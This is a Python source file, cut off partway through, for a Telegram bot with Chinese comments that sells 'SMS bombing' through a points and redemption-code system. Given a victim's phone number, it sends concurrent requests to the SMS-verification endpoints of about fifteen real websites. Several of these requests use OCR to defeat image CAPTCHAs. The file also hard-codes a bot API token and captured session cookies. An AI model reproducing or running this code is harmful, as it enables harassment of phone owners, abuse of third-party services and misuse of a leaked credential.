# -*- coding: utf-8 -*-
import re
import base64
import asyncio
import aiohttp
import telebot
import os
import json
import time
import ddddocr
from PIL import Image
from io import BytesIO

API_TOKEN = "7418093343:AAHtR8qcmeEqknS0AeBYxmXv92CLsj6l4hw"
bot = telebot.TeleBot(API_TOKEN)
PHONE_REGEX = re.compile(r'^1[3-9]\d{9}$')  # 用于验证手机号
POINTS_FILE = "points_v2.json"
EXCHANGE_CODES_FILE = "exchange_codes.txt"


user_state = {}










@bot.message_handler(commands=['start'])
def handle_start_command(message):
    user_id = message.from_user.id
    points = load_points()

    # 检查用户ID是否在JSON文件中
    if str(user_id) not in points:
        # 如果不在，初始化用户数据
        initialize_user(user_id)
        bot.send_message(message.chat.id, "欢迎新用户！您的数据已初始化。")
    else:
        # 如果在，回复欢迎信息
        bot.send_message(message.chat.id, "欢迎使用该机器人！")









#-----------------------------------------------------------------------------------------------------------------------------
# 初始化积分文件
if not os.path.exists(POINTS_FILE):
    with open(POINTS_FILE, "w") as f:
        json.dump({}, f)
# 初始化兑换码文件
if not os.path.exists(EXCHANGE_CODES_FILE):
    with open(EXCHANGE_CODES_FILE, "w") as f:
        f.write("")
# 加载积分数据
def load_points():
    with open(POINTS_FILE, "r") as f:
        return json.load(f)
# 保存积分数据
def save_points(points):
    with open(POINTS_FILE, "w") as f:
        json.dump(points, f)













# 初始化用户数据
def initialize_user(user_id):
    points = load_points()
    if str(user_id) not in points:
        points[str(user_id)] = {"current_points": 0, "total_spent": 0, "membership": "普通用户"}
    elif isinstance(points[str(user_id)], int):  # 如果用户数据是整数，修复为字典
        points[str(user_id)] = {"current_points": points[str(user_id)], "total_spent": 0, "membership": "普通用户"}
    save_points(points)

















#-----------------------------------------------------------------------------------------------------------------------------

# 更新会员段位
def update_membership(user_id, total_spent):
    if total_spent >= 2000:
        return "至尊用户"
    elif total_spent >= 500:
        return "钻石用户"
    elif total_spent >= 200:
        return "黄金用户"
    else:
        return "普通用户"

# 扣除积分并更新用户数据
def deduct_points(user_id, amount):
    points = load_points()
    initialize_user(user_id)  # 确保用户数据初始化
    user_data = points[str(user_id)]
    user_data["current_points"] -= amount
    user_data["total_spent"] += amount
    user_data["membership"] = update_membership(user_id, user_data["total_spent"])
    save_points(points)







#-----------------------------------------------------------------------------------------------------------------------------


# 模拟短信轰炸
async def sms_bomb(phone_number):
    tasks = [
        hz1(phone_number),
        hz2(phone_number),
        hz3(phone_number),
        hz4(phone_number),
        hz5(phone_number),
        hz6(phone_number),
        hz7(phone_number),
        hz8(phone_number),
        hz9(phone_number),
        hz10(phone_number),
        hz11(phone_number),
        hz13(phone_number),
        hz14(phone_number),
        hz15(phone_number),
        hz16(phone_number),
    ]
    await asyncio.gather(*tasks)


#-----------------------------------------------------------------------------------------------------------------------------












#-----------------------------------------------------------------------------------------------------------------------------

# 处理 /hz 命令
@bot.message_handler(commands=['hz'])
def handle_hz_command(message):
    user_id = message.from_user.id
    points = load_points()
    if str(user_id) not in points:
        # 如果不在，初始化用户数据
        initialize_user(user_id)
        bot.send_message(message.chat.id, "欢迎新用户！您的数据已初始化。")
    else:
        # 如果在，回复欢迎信息
        bot.send_message(message.chat.id, "欢迎使用该机器人！")
        initialize_user(user_id)  # 确保用户数据初始化
        user_data = points[str(user_id)]
        if user_data["current_points"] < 10:
            bot.send_message(message.chat.id, "积分不足，无法进行短信轰炸。")
            return

        phone_number = message.text.split()[1] if len(message.text.split()) > 1 else None
        if phone_number and PHONE_REGEX.match(phone_number):
            try:
                asyncio.run(sms_bomb(phone_number))
                bot.reply_to(message, "短信轰炸已启动！")
                deduct_points(user_id, 10)  # 扣除积分并更新用户数据
            except Exception as e:
                bot.reply_to(message, f"短信轰炸失败：{str(e)}")
        else:
            bot.reply_to(message, "无效的手机号，请重新输入。")




#-----------------------------------------------------------------------------------------------------------------------------












#-----------------------------------------------------------------------------------------------------------------------------

@bot.message_handler(commands=['my'])
def handle_my_command(message):
    user_id = message.from_user.id
    points = load_points()
    if str(user_id) not in points:
        # 如果不在，初始化用户数据
        initialize_user(user_id)
        bot.send_message(message.chat.id, "欢迎新用户！您的数据已初始化。")
    else:
        # 如果在，回复欢迎信息
        bot.send_message(message.chat.id, "欢迎使用该机器人！")
        initialize_user(user_id)  # 确保用户数据初始化
        user_data = points[str(user_id)]

        if not isinstance(user_data, dict):  # 如果 user_data 不是字典，修复它
            user_data = {"current_points": user_data, "total_spent": 0, "membership": "普通用户"}
            points[str(user_id)] = user_data
            save_points(points)

        current_points = user_data.get("current_points", 0)
        total_spent = user_data.get("total_spent", 0)
        membership = user_data.get("membership", "普通用户")

        bot.send_message(message.chat.id, f"个人中心\n"
                                          f"用户 ID: {user_id}\n"
                                          f"当前积分: {current_points}分\n"
                                          f"历史消耗积分: {total_spent}分\n"
                                          f"会员段位: {membership}")

# 处理 /cz 命令
@bot.message_handler(commands=['cz'])
def handle_cz_command(message):
    user_id = message.from_user.id
    points = load_points()
    if str(user_id) not in points:
        # 如果不在，初始化用户数据
        initialize_user(user_id)
        bot.send_message(message.chat.id, "欢迎新用户！您的数据已初始化。")
    else:
        # 如果在，回复欢迎信息
        bot.send_message(message.chat.id, "欢迎使用该机器人！")
        bot.send_message(message.chat.id, "请输入兑换码：")
        user_state[message.from_user.id] = 'exchange_code'

# 处理用户输入兑换码
@bot.message_handler(content_types=['text'], func=lambda message: user_state.get(message.from_user.id) == 'exchange_code')
def handle_exchange_code(message):
    user_id = message.from_user.id
    exchange_code = message.text
    points = load_points()
    initialize_user(user_id)  # 确保用户数据初始化

    with open(EXCHANGE_CODES_FILE, "r") as f:
        codes = f.read().splitlines()

    if exchange_code in codes:
        # 更新用户积分
        points[str(user_id)]["current_points"] += 50
        save_points(points)

        # 从兑换码文件中移除已使用的兑换码
        codes.remove(exchange_code)
        with open(EXCHANGE_CODES_FILE, "w") as f:
            f.write("\n".join(codes))

        bot.reply_to(message, "兑换成功，已增加 50 积分。")
    else:
        bot.reply_to(message, "兑换码无效，请重试。")

    del user_state[user_id]
#-----------------------------------------------------------------------------------------------------------------------------











#-----------------------------------------------------------------------------------------------------------------------------

async def hz1(phone_number):
    url = "http://www.lugangtong56.com/zuul-lgt/lgt-app-member/wxLogin/sendMessageByRegister"
    headers = {
        "Host": "www.lugangtong56.com",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2417A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.188 Mobile Safari/537.36 XWEB/1260183 MMWEBSDK/20240501 MMWEBID/4037 MicroMessenger/8.0.50.2701(0x2800323E) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://www.lugangtong56.com",
        "X-Requested-With": "com.tencent.mn",
        "Referer": "http://www.lugangtong56.com/lgt-app-driver-weixin/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    payload = {
        "phone": phone_number
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, data=payload) as response:
            result = await response.text()
            print('hz1', result)
async def hz2(phone_number):
    url = "https://www.fupin832.com/oauth/captcha/getRegisterCode"
    cookies = {
        'com.jiaxincloud.mcs.cookie.username': 'web38716556251777025',
        'sajssdk_2015_cross_new_user': '1',
        'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%221948951a9cb1994-0b400d7c1a20728-4c657b58-1821369-1948951a9cc157%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fcn.bing.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTk0ODk1MWE5Y2IxOTk0LTBiNDAwZDdjMWEyMDcyOC00YzY1N2I1OC0xODIxMzY5LTE5NDg5NTFhOWNjMTU3In0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%7D',
        'JSESSIONID': '6057B4D111EBA63C4122A4DD931D0225',
    }
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://www.fupin832.com',
        'Pragma': 'no-cache',
        'Referer': 'https://www.fupin832.com/pages/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'phone': phone_number,
    }
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.post(url, headers=headers, json=json_data) as response:
            result = await response.text()
            print('hz2', result)

# 异步版本的 hz3
async def hz3(phone_number):
    url = "https://api.xfb315.com/auth/send_sms"
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://www.xfb315.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.xfb315.com/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'source': 'pc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
    }
    json_data = {
        'phone': phone_number,
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=json_data) as response:
            result = await response.text()
            print('hz3', result)

# 异步版本的 hz4
async def hz4(phone_number):
    url = "https://xmind.cn/_res/user/signup_with_phone"
    cookies = {
        '_gcl_au': '1.1.1214922259.1737723406',
        'Hm_lvt_087caa731c66e1c62df8b40cbbd38375': '1737723407',
        'Hm_lpvt_087caa731c66e1c62df8b40cbbd38375': '1737723407',
        'HMACCOUNT': 'C6B463ECCEB86F1B',
        '_uetsid': 'ac1f4250da5211efa3cbfd067243d917',
        '_uetvid': 'ac1f39a0da5211ef81642d3a0fd9cc77',
    }
    headers = {
        'accept': '*/*',
        'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'baggage': 'sentry-environment=cn_prod,sentry-public_key=b46282a38f0ebfc8974484150a8b0aef,sentry-trace_id=d7fe1f38fd084bf88bf95294cd867490',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://xmind.cn/signup/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sentry-trace': 'd7fe1f38fd084bf88bf95294cd867490-bdd7b77a60e13e28',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }
    params = {
        'phone': phone_number,
    }
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.get(url, headers=headers, params=params) as response:
            result = await response.text()
            print('hz4', result)

# 异步版本的 hz5
async def hz5(phone_number):
    url = "https://openapi.yishi-tong.com/account_system/open/sms/sendRegisterAccountSmsCode"
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://account.yishi-tong.com',
        'Pragma': 'no-cache',
        'Referer': 'https://account.yishi-tong.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Token': '',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'phone': phone_number,
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=json_data) as response:
            result = await response.text()
            print('hz5', result)
async def hz6(phone_number):
    url = "https://openapi.yishi-tong.com/account_system/open/sms/sendSmsCode"
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://account.yishi-tong.com',
        'Pragma': 'no-cache',
        'Referer': 'https://account.yishi-tong.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Token': '',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'phone': phone_number,
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=json_data) as response:
            result = await response.text()
            print('hz6', result)

# 异步版本的 hz7
async def hz7(phone_number):
    url_imgcaptcha = "https://lelink.lenovo.com.cn/v1/user/register/imgcaptcha"
    url_mobile_captcha = "https://lelink.lenovo.com.cn/v1/user/register/mobile/captcha/"
    cookies = {
        'X-LELINK-SID': 'ue2p3fcgbrb1r0rh4rj338fj32',
    }
    headers = {
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://lelink.lenovo.com.cn/front/register.html',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
    }
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.get(url_imgcaptcha, headers=headers) as response:
            image_data = await response.read()
            image = Image.open(BytesIO(image_data))
            ocr = ddddocr.DdddOcr()
            result = ocr.classification(image)
            print('验证码识别结果:', result)

        headers_2 = {
            'accept': '*/*',
            'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': 'https://lelink.lenovo.com.cn/front/register.html',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'mobile': phone_number,
            'imgcaptcha': result,
        }
        async with session.get(url_mobile_captcha, params=params, headers=headers_2) as response:
            result = await response.text()
            print('hz7', result)

# 异步版本的 hz8
async def hz8(phone_number):
    url = "https://www.kuaijiexi.com/sendPhoneMessage"
    cookies = {
        'acw_tc': '1a0c651717377272268383436e012df5bfc089f009e9a818e113502c06d100',
        'PHPSESSID': '02206635e5517155b0aebe80b843b372',
        'Hm_lvt_69f762b841cef84af7d3bc0ad484c5e8': '1737727230',
        'Hm_lpvt_69f762b841cef84af7d3bc0ad484c5e8': '1737727230',
        'HMACCOUNT': 'C6B463ECCEB86F1B',
        'AGL_USER_ID': 'e387da8a-1fbc-4075-9ab3-5da22bfa3db8',
    }
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.kuaijiexi.com',
        'Pragma': 'no-cache',
        'Referer': 'https://www.kuaijiexi.com/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    data = {
        'mobile': phone_number,
    }
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.post(url, headers=headers, data=data) as response:
            result = await response.text()
            print('hz8', result)

# 异步版本的 hz9
async def hz9(phone_number):
    url_get_captcha = "https://user.ifeng.com/api/v1/get/captcha"
    url_send_sms = "https://user.ifeng.com/api/v1/sendsms"
    current_timestamp = int(time.time() * 1000)
    headers_get = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Referer': 'https://user.ifeng.com/register/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    params_get = {
        'type': '2',
        'platform': 'w',
        'systemid': '1',
        '_': str(current_timestamp),
    }
    async with aiohttp.ClientSession() as session:
        async with session.get(url_get_captcha, params=params_get, headers=headers_get) as response:
            response_json = await response.json()
            base64_data = response_json["image"].split(",")[1]
            image_data = base64.b64decode(base64_data)
            image = Image.open(BytesIO(image_data))
            ocr = ddddocr.DdddOcr()
            result = ocr.classification(image)
            print('验证码识别结果:', result)

        id = response_json['id']
        headers_post = {
            'Accept': '*/*',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://user.ifeng.com',
            'Pragma': 'no-cache',
            'Referer': 'https://user.ifeng.com/register/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        params_post = {
            'platform': 'w',
            'systemid': '1',
        }
        data_post = {
            'mobile': phone_number,
            'smsform': 1,
            'captcha_code': result,
            'captcha_id': id
        }
        async with session.post(url_send_sms, params=params_post, headers=headers_post, data=data_post) as response:
            result = await response.text()
            print('hz9', result)
async def hz10(phone_number):
    url = "https://bbs.anjian.com/tools/ajax.aspx"
    cookies = {
        'allowchangewidth': '',
        'Hm_lvt_5d96b144d9b7632ed0ce359527dcc65d': '1737859944',
        'HMACCOUNT': 'C6B463ECCEB86F1B',
        'Hm_lpvt_5d96b144d9b7632ed0ce359527dcc65d': '1737861771',
        'dntVC': 'uvhHK8Sl6oqDPfNOEC81OEA9LgVhIZblAfGO8ijrC9U=',
    }
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Referer': 'https://bbs.anjian.com/register.aspx',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    params = {
        't': 'getsmscode',
        'regType': 'reguser',
        'uid': phone_number,
        'mobile': phone_number,
        'vcode': '4ptwb',
        'auth': phone_number,
        'ts': '',
    }
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.get(url, params=params, headers=headers) as response:
            result = await response.text()
            print('hz10', result)

# 异步版本的 hz11
async def hz11(phone_number):
    url = "https://passport.ks5u.com/RPAjax.ashx"
    cookies = {
        'acw_tc': '2760827117379670063823645e4e98b6298c2be57336945ab198f744319eb0',
        'ASP.NET_SessionId': '21hgg1f5zjap3trpklxlqqbm',
        'CheckCode': 'BJP3',
    }
    headers = {
        'Accept': 'text/plain, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Referer': 'https://passport.ks5u.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    params = {
        'PhoneNum': phone_number,
        'Param': '0x0x9',
        'yan': 'bjp3',
    }
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.get(url, params=params, headers=headers) as response:
            result = await response.text()
            print('hz11', result)

# 异步版本的 hz12
async def hz13(phone_number):
    url = "https://passport.jumpw.com/UserManager.do"
    cookies = {
        'acw_tc': '1a0c651117400324659156542e00703fbbdee3f373636ee49d9e046ee28c8c',
        'JSESSIONID': '7C367E1FE2EBCB65D22DCC37BE21C726',
        '_xsrf': '1740032471558|04e0cbac5c9986c153d33021ef7a55c9|eec72925ab2a32cadf57bbb3371b04fa',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://passport.jumpw.com',
        'Pragma': 'no-cache',
        'Referer': 'https://passport.jumpw.com/views/register.jsp',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'serviceCode': '100100096',
        'Phonestr': phone_number,
    }

    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.post(url, headers=headers, data=data) as response:
            response_text = await response.text()
            print("hz13:", response_text)

# 异步版本的 hz14
async def hz14(phone_number):
    url = "https://sso.people.com.cn/u/reg/sendPhoneCode2"
    cookies = {
        '__jsluid_s': 'fd37e129ee2102b3e6e291ff56d79f8f',
        'JSESSIONID': 'C277DAF1935FAF52C10D6713DAEBC743',
        'rand_code': 'YP1z+TipgrRpT8Vpod6D8g==',
    }
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://sso.people.com.cn',
        'Pragma': 'no-cache',
        'Referer': 'https://sso.people.com.cn/u/reg?appCode=ENw9NE44',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    data = {
        'phoneNum': phone_number,
        'verCode': '大口',
    }
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.post(url, headers=headers, data=data) as response:
            result = await response.text()
            print('hz14', result)

# 异步版本的 hz15
async def hz15(phone_number):
    url_yzm = "https://www.yihu.com/Public/verityEntry"
    url_send_code = "https://www.yihu.com/Register/sendRegPhoneCode.shtml"
    current_timestamp = int(time.time() * 1000)
    current_timestamp1 = int(time.time() * 1000)
    current_timestamp2 = int(time.time() * 1000)
    cookies = {
        'PHPSESSID': 'd2ov73su8jttj63t9lckhjfrf4',
        'YIHU_UserArea': '15%7C145%7C%E6%B5%8E%E5%AE%81%7C%E5%B1%B1%E4%B8%9C%7CSINGLE_CITY',
        'YIHU_webNotic': '%3F',
        'YIHU_platformType': '1000000',
        'jkzlAn_uuid': 'A3B72911-D350-40E6-9D90-E848F4557596',
        'jkzlAn_refercode': '',
        'jkzlAn_utm_source': '',
        'jkzlAn_sid': '42324338-7BCA-4354-8DDC-CC7E7A7EE707',
        'jkzlAn_channelid': '1000000',
        'jkzlAn_userid': '-1',
        'Hm_lvt_50a96b999b752ef15792867dfda15c2a': '1738042867',
        'Hm_lpvt_50a96b999b752ef15792867dfda15c2a': '1738042867',
        'HMACCOUNT': 'C6B463ECCEB86F1B',
        'jkzlAn_ct': '1738042870914',
    }
    headers_yzm = {
        'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Referer': 'https://www.yihu.com/Register/index',
        'Sec-Fetch-Dest': 'image',
        'Sec-Fetch-Mode': 'no-cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    async with aiohttp.ClientSession(cookies=cookies) as session:
